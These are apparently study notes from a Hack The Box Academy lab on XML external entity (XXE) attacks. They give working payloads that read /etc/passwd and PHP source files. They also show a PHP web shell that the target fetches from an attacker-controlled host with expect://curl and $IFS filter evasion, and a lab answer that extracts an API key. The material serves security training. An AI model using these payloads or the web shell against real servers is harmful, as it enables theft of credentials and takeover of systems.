---
description: >-
  When a web application trusts unfiltered XML data from user input, we may be
  able to reference an external XML DTD document and define new custom XML
  entities
---

# Local File Disclosure

## Identification

1. find page that accept XML input

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg" alt=""><figcaption><p>http://SERVER_IP:PORT/index.php</p></figcaption></figure>

if we click Send Data, the request will be as following

![xxe\_request](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_request.jpg)

The application is sending data in XML format to web server. If the web app uses outdated XML libraries and sanitize or have any filters, we may be able to exploit this XML to read local files.

![xxe\_response](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_response.jpg)

The value of email element is returned back to us `email@xxe.htb`. This is **important to know what element is displayed back** so we know where to inject.

Now try to create new entity to be placed in the `email` element and see if it gets replaced with the defined value.

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

{% hint style="info" %}
In the original request it has no DTD in the XML data or being referenced externally so we add new DTD before defining our entity (if DOCTYPE was already defined, we can just ignore it and add the entity alone)
{% endhint %}

![new\_entity](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_new\_entity.jpg)

As seen in the response we referenced the entity and it was replaced with `Inlane Freight` This confirms that the web app is vulnerable to XXE.

> a non-vulnerable web application would display (`&company;`) as a raw value.

{% hint style="info" %}
Some web app may use JSON by default but also accept XML. So it's worth trying XML by changing the Content-Type to application/xml and [convert the JSON request to XML](https://www.convertjson.com/json-to-xml.htm)
{% endhint %}

## Reading Sensitive Files

Doing the same steps as [Identification](local-file-disclosure.md#identification) but we will add the SYSTEM keyword and define external reference path as a value after it.

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

![external\_entity](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_external\_entity.jpg)

**we have successfully exploited the XXE vulnerability to read local files**

> Check for config files, SSH keys, and other use full files that might help on compromising the system.

## Reading Source Code

This might reveal secret configurations like database passwords or API keys.

![file\_php](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_file\_php.jpg)

**The file is not in a proper XML format**, so it fails to be referenced as an external XML entity. **If a file contains some of XML's special characters (e.g. \</>/&), it would break the external entity reference** and not be used for the reference.

We can use PHP wrapper filter to encode the contents to base64, Instead of using `file://` we use `php://filter/` wrapper and specify `convert.base64-encode` following with the file name.

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![file\_php](https://academy.hackthebox.com/storage/modules/134/web\_attacks\_xxe\_php\_filter.jpg)

{% hint style="warning" %}
This encoding technique only works with PHP web app!
{% endhint %}

## RCE with XXE

Best way

* Look for `id_rsa` file, or
* Steal hash from windows

**Other way**

* Execute command using `PHP://expect` (only works when expect is installed and enabled)

Most efficient to turn XXE -> RCE is fetching web shell from our server and writing it to web app

**On attack machine**

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

**XML body**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

&#x20;Note that all spaces are replaced with $IFS as learned in [filter-evasion.md](../../command-injection/filter-evasion.md "mention") to not break the syntax (other special characters may break the code so try avoiding them)

Once sent we will get the recieve message for shell.php file in our console and we can interact with the web shell for code execution.

## Other XXE Attacks

* **SSRF exploitation ->** used to enumerate locally open ports and access their pages
* **DOS ->** causing self-reference loops
  * no longer works on modern web servers becase they protect against entitiy self-reference

## Assessment

Try to read the content of the 'connection.php' file, and submit the value of the 'api\_key' as the answer.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption><p>email element is the target</p></figcaption></figure>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY target SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name></name>
<tel></tel>
<email>&target;</email>
<message></message>
</root>
```

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption><p>UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg</p></figcaption></figure>
